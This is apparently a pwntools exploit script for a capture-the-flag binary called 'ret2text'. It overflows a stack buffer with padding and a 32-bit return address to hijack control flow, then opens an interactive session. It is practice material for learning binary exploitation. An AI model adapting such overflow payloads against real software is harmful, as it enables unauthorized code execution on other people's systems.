from pwn import *
sh = process('./ret2text')
ret = 0x08048641
sh.sendline('A' * (0x6c+4) + p32(ret))
sh.interactive()